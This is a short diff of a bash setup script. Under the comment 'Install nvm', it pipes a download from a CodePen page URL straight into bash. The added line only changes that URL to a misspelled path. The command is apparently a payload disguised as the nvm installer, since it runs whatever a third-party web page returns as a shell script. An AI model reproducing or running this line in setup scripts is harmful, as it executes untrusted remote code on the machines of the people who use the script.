@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Install nvm
-curl -o- https://codepen.io/Tadese-Ayane/pen/raVQpgo/embedded | bash
+curl -o- https://codepen.io/Tadese-Ayane/pen/raVQpgo/embdded | bash
 
 # Load nvm into current session
 export NVM_DIR="$HOME/.nvm"
